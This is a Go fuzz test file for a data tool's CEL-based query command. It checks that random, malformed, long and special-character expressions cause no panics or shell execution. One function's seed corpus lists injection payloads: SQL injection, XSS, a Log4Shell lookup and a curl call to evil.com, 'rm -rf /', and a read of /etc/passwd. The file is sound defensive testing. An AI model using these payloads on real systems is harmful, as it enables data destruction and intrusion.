package fuzz

import (
	"bytes"
	"os/exec"
	"strings"
	"testing"
)

// FuzzQueryExpression tests the query command against random CEL expressions.
func FuzzQueryExpression(f *testing.F) {
	validExpressions := []string{
		"record.age > 18",
		"record.age >= 30 && record.name.startsWith('A')",
		"record.email.contains('example')",
		"record.age != 25",
		"!(record.age == 25)",
		"record.age > 25 || record.age < 20",
		"has(record.age)",
		"record.name == 'Alice'",
		"record.age > 0 && record.age < 100",
		"true",
		"false",
	}

	for _, expr := range validExpressions {
		f.Add(expr)
	}

	f.Add("")                            // empty expression
	f.Add("record.")                     // incomplete
	f.Add("record.age >")                // incomplete
	f.Add("record..age > 18")            // double dot
	f.Add("(record.age > 18")            // unclosed paren
	f.Add("record.age >>> 18")           // invalid operator
	f.Add(strings.Repeat("(", 100))      // many parens
	f.Add(strings.Repeat("record.", 50)) // repeated prefix

	f.Fuzz(func(t *testing.T, expression string) {
		cmd := exec.Command("/tmp/gavro", "query", "../../tests/testdata/users.avro", expression)
		var stderr bytes.Buffer
		cmd.Stderr = &stderr

		_ = cmd.Run()

		stderrStr := stderr.String()

		if strings.Contains(stderrStr, "panic") {
			t.Errorf("Program panicked on expression: %s\nStderr: %s", expression, stderrStr)
		}

		if strings.Contains(stderrStr, "runtime error") {
			t.Errorf("Runtime error on expression: %s\nStderr: %s", expression, stderrStr)
		}

		if cmd.ProcessState != nil {
			exitCode := cmd.ProcessState.ExitCode()
			if exitCode < -1 {
				t.Errorf("Unexpected exit code %d (possible crash) for expression: %s", exitCode, expression)
			}
		}
	})
}

// FuzzQueryExpressionInjection verifies CEL safely handles injection attempts.
func FuzzQueryExpressionInjection(f *testing.F) {
	injections := []string{
		"'; DROP TABLE users; --",
		"1 OR 1=1",
		"<script>alert('xss')</script>",
		"${jndi:ldap://evil.com/a}",
		"../../etc/passwd",
		"record.age > 18; rm -rf /",
		"record.age > 18 && system('ls')",
		"record.age > 18 `whoami`",
		"record.age > 18 | curl evil.com",
	}

	for _, inj := range injections {
		f.Add(inj)
	}

	f.Fuzz(func(t *testing.T, expression string) {
		cmd := exec.Command("/tmp/gavro", "query", "../../tests/testdata/users.avro", expression)
		var stderr bytes.Buffer
		cmd.Stderr = &stderr

		_ = cmd.Run()

		stderrStr := stderr.String()

		if strings.Contains(stderrStr, "panic") {
			t.Errorf("Panic on injection attempt: %s", expression)
		}

		if strings.Contains(stderrStr, "command not found") ||
			strings.Contains(stderrStr, "sh:") ||
			strings.Contains(stderrStr, "bash:") {
			t.Errorf("Possible command execution attempt for: %s", expression)
		}
	})
}

// FuzzQueryLongExpression tests that very long expressions do not cause crashes.
func FuzzQueryLongExpression(f *testing.F) {
	lengths := []int{100, 1000, 10000}

	for _, length := range lengths {
		expr := strings.Repeat("record.age > 18 && ", length/20) + "record.age > 18"
		if len(expr) > length {
			expr = expr[:length]
		}
		f.Add(expr)
	}

	f.Fuzz(func(t *testing.T, expression string) {
		if len(expression) > 100000 {
			t.Skip()
		}

		cmd := exec.Command("/tmp/gavro", "query", "../../tests/testdata/users.avro", expression)
		var stderr bytes.Buffer
		cmd.Stderr = &stderr

		_ = cmd.Run()

		stderrStr := stderr.String()

		if strings.Contains(stderrStr, "panic") {
			t.Errorf("Panic on long expression (len=%d)", len(expression))
		}
	})
}

// FuzzQuerySpecialCharacters tests that special characters in expressions do not cause crashes.
func FuzzQuerySpecialCharacters(f *testing.F) {
	specialChars := []string{
		"\x00",         // null byte
		"\n\r\t",       // whitespace
		"'\"\\",        // quotes and backslash
		"{}[]()<>",     // brackets
		"!@#$%^&*",     // special chars
		"™£¥€",         // unicode
		"😀🎉🚀",          // emoji
		"\u0000\uffff", // unicode range
	}

	for _, chars := range specialChars {
		f.Add("record.age > 18 " + chars)
		f.Add(chars + " record.age > 18")
		f.Add("record." + chars + " > 18")
	}

	f.Fuzz(func(t *testing.T, expression string) {
		cmd := exec.Command("/tmp/gavro", "query", "../../tests/testdata/users.avro", expression)
		var stderr bytes.Buffer
		cmd.Stderr = &stderr

		_ = cmd.Run()

		stderrStr := stderr.String()

		if strings.Contains(stderrStr, "panic") {
			t.Errorf("Panic on special characters in: %q", expression)
		}

		if strings.Contains(stderrStr, "runtime error") {
			t.Errorf("Runtime error on special characters in: %q", expression)
		}
	})
}
